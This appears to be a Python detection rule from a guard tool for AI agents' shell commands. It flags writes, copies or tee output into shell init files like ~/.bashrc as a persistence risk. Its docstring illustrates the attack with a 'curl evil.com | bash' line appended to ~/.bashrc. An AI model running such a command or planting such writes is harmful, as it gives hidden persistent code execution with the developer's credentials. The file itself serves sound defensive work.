"""
bashguard.rules.shell_rc_inject — Detect writes to shell initialization files.

Shell RC files (~/.bashrc, ~/.zshrc, ~/.profile, etc.) are sourced
automatically on every interactive shell login.  Appending a payload gives
persistent code execution without any continued agent presence — the developer
triggers it every time they open a terminal.

Attack chain:
  agent appends `curl evil.com | bash` to ~/.bashrc
  → developer opens new terminal
  → bash sources ~/.bashrc → payload runs with developer credentials

MITRE ATT&CK: T1546.004 (Event Triggered Execution: Unix Shell Config)

Severity is HIGH (not CRITICAL) because agents occasionally legitimately
modify shell init files during development environment setup.  But this
should still require explicit approval.

Rule:
  persistence.shell_rc_inject  (HIGH) — write to any shell init file
"""
from __future__ import annotations

import logging

import tree_sitter_bash as tsb
from tree_sitter import Language, Parser as TSParser

from bashguard.models import ActionType, ExecutionContext, Finding, Severity
from bashguard.parser import parse
from bashguard.rules import register

_log = logging.getLogger(__name__)

_LANG = Language(tsb.language())
_PARSER = TSParser(_LANG)

_WRITE_OPERATORS = {">", ">>"}
_COPY_MOVE_CMDS = {"cp", "mv"}
_TEE_CMDS = {"tee"}

# Tilde-prefixed RC file patterns
_RC_TILDE_TARGETS = frozenset({
    "~/.bashrc",
    "~/.zshrc",
    "~/.profile",
    "~/.bash_profile",
    "~/.bash_login",
    "~/.bash_logout",
    "~/.zshenv",
    "~/.zprofile",
    "~/.zlogin",
    "~/.zlogout",
    "~/.kshrc",
    "~/.mkshrc",
    "~/.tcshrc",
    "~/.cshrc",
    "~/.config/fish/config.fish",
})

# Basenames that identify shell RC files (for /home/<user>/... absolute paths)
_RC_BASENAMES = frozenset({
    ".bashrc", ".zshrc", ".profile", ".bash_profile",
    ".bash_login", ".bash_logout", ".zshenv", ".zprofile",
    ".zlogin", ".zlogout", ".kshrc", ".mkshrc", ".tcshrc", ".cshrc",
    "config.fish",
})


def _is_rc_target(path: str) -> bool:
    """True if path is a shell initialization file write target."""
    clean = path.strip("'\"")

    # Direct tilde match
    if clean in _RC_TILDE_TARGETS:
        return True

    # Tilde prefix match for fish config
    if clean.startswith("~/.config/fish/"):
        basename = clean.rsplit("/", 1)[-1]
        return basename in _RC_BASENAMES

    # Absolute /home/<user>/ or /Users/<user>/ paths
    if clean.startswith("/home/") or clean.startswith("/Users/"):
        basename = clean.rsplit("/", 1)[-1]
        return basename in _RC_BASENAMES

    return False


def _walk_write_redirects(node, source: bytes, targets: list[str]) -> None:
    if node.type == "file_redirect":
        operator = None
        target = None
        for child in node.children:
            if child.type in _WRITE_OPERATORS:
                operator = child.type
            elif child.type in ("word", "string", "raw_string", "concatenation"):
                target = source[child.start_byte:child.end_byte].decode("utf-8", errors="replace")
        if operator and target:
            targets.append(target)
    for child in node.children:
        _walk_write_redirects(child, source, targets)


def _redirect_targets(script: str) -> list[str]:
    try:
        source = script.encode("utf-8", errors="replace")
        tree = _PARSER.parse(source)
        targets: list[str] = []
        _walk_write_redirects(tree.root_node, source, targets)
        return targets
    except Exception:
        return []


@register
class ShellRcInjectRule:
    """
    Flag any write to shell initialization files.

    Shell RC files are sourced on every interactive login.  Appending a
    payload persists execution across sessions without further agent activity.
    The developer unknowingly triggers the payload every time they open a
    terminal.

    Covers bash, zsh, fish, ksh, tcsh, and POSIX sh init files.

    MITRE ATT&CK: T1546.004 (Event Triggered Execution: Unix Shell Config)
    """

    rule_id = "persistence.shell_rc_inject"
    severity = Severity.HIGH
    description = "Write to shell init file (~/.bashrc, ~/.zshrc, etc.) — persistent execution on login"

    def check(self, script: str, context: ExecutionContext) -> list[Finding]:
        try:
            findings: list[Finding] = []

            # 1. Shell redirect targets (>, >>)
            for target in _redirect_targets(script):
                if _is_rc_target(target):
                    findings.append(Finding(
                        rule_id=self.rule_id,
                        severity=Severity.HIGH,
                        message="Write to shell init file: persistent execution on every login",
                        matched_text=target.strip("'\""),
                        action_type=ActionType.SYSTEM_CONFIG,
                    ))

            # 2. cp/mv/tee destinations
            try:
                cmds = parse(script)
                for cmd in cmds:
                    if cmd.name in _TEE_CMDS:
                        for arg in cmd.args:
                            if _is_rc_target(arg):
                                findings.append(Finding(
                                    rule_id=self.rule_id,
                                    severity=Severity.HIGH,
                                    message="tee to shell init file: persistent execution on every login",
                                    matched_text=arg.strip("'\""),
                                    action_type=ActionType.SYSTEM_CONFIG,
                                ))
                    elif cmd.name in _COPY_MOVE_CMDS:
                        if cmd.args and _is_rc_target(cmd.args[-1]):
                            findings.append(Finding(
                                rule_id=self.rule_id,
                                severity=Severity.HIGH,
                                message=f"{cmd.name} to shell init file: persistent execution on every login",
                                matched_text=cmd.args[-1].strip("'\""),
                                action_type=ActionType.SYSTEM_CONFIG,
                            ))
            except Exception:
                pass

            return findings
        except Exception as e:
            _log.error("ShellRcInjectRule raised: %s", e, exc_info=True)
            return []
